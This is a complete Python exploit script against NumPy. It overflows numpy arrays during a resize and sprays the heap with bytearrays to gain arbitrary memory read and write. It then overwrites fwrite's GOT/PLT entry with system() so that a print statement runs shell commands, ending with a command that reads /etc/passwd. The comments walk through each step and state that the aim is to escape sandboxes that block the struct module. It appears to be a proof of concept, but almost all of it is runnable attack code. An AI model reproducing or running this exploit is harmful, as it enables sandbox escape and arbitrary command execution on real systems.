import numpy as np

# addr_to_str is a quick and dirty replacement for struct.pack(), needed
# for sandbox environments that block the struct module.
def addr_to_str(addr):
    addr_str = "%016x" % (addr)
    ret = str()
    for i in range(16, 0, -2):
        ret = ret + addr_str[i-2:i].decode('hex')
    return ret

# r3ad_address and write_address use overflown numpy arrays to search for
# bytearray objects we've sprayed on the heap, represented as a PyByteArray
# structure:
# 
# struct PyByteArray {
#     Py_ssize_t ob_refcnt;
#     struct _typeobject *ob_type;
#     Py_ssize_t ob_size;
#     int ob_exports;
#     Py_ssize_t ob_alloc;
#     char *ob_bytes;
# };
# 
# Once located, the pointer to actual data `ob_bytes` is overwritten with the
# address that we want to r3ad or write. We then cycle through the list of byte
# arrays until we find the  one that has been corrupted. This bytearray is used
# to r3ad or write the desired location. Finally, we clean up by setting
# `ob_bytes` back to its original value.
def find_address(addr, data=None):
    i = 0
    j = -1
    k = 0

    if data:
        size = 0x102
    else:
        size = 0x103
    for k, arr in enumerate(arrays):
        i = 0
        for i in range(0x2000): # 0x2000 is a value that happens to work
            # Here we search for the signature of a PyByteArray structure
            j = arr[0][i].find(addr_to_str(0x1))                  # ob_refcnt
            if (j < 0 or
                arr[0][i][j+0x10:j+0x18] != addr_to_str(size) or  # ob_size
                arr[0][i][j+0x20:j+0x28] != addr_to_str(size+1)): # ob_alloc
                continue
            idx_bytes = j+0x28                                    # ob_bytes

            # Save an unclobbered copy of the bytearray metadata
            saved_metadata = arrays[k][0][i]

            # Overwrite the ob_bytes pointer with the provded address
            addr_string = addr_to_str(addr)
            new_metadata = (saved_metadata[0:idx_bytes] +
                     addr_string +
                     saved_metadata[idx_bytes+8:])
            arrays[k][0][i] = new_metadata

            ret = None
            for bytearray_ in bytearrays:
                try:
                    # We differentiate the signature by size for each
                    # find_address invocation because we don't want to
                    # accidentally clobber the wrong  bytearray structure.
                    # We know we've hit the structure we're looking for if
                    # the size matches and it contents do not equal 'XXXXXXXX'
                    if len(bytearray_) == size and bytearray_[0:8] != 'XXXXXXXX':
                        if data:
                            bytearray_[0:8] = data # write memory
                        else:
                            ret = bytearray_[0:8] # r3ad memory

                        # restore the original PyByteArray->ob_bytes
                        arrays[k][0][i] = saved_metadata
                        return ret
                except:
                    pass
    raise Exception("Failed to find address %x" % addr)

def get_address(addr):
    return find_address(addr)

def write_address(addr, data):
    find_address(addr, data)


# The address of GOT/PLT entries for system() and fwrite() are hardcoded. These
# addresses are static for a given Python binary when compiled without -fPIE.
# You can obtain them yourself with the following command:
# `getelf -a /path/to/python/ | grep -E '(system|fwrite)'
SYSTEM = 0x8eb278
FWRITE = 0x8eb810

# Spray the heap with some bytearrays and overflown numpy arrays.
arrays = []
bytearrays = []
for i in range(100):
    arrays.append(np.array('A'*0x100))
    arrays[-1].resize(0x1000, 0x100000000000001)
    bytearrays.append(bytearray('X'*0x102))
    bytearrays.append(bytearray('X'*0x103))

# get the address of system() and write it to fwrite()'s PLT entry. 
data = get_address(SYSTEM)
write_address(FWRITE, data)

# print() will now call system() with whatever string you pass
print "PS1='[HACKED] $ ' /bin/cat /etc/passwd"
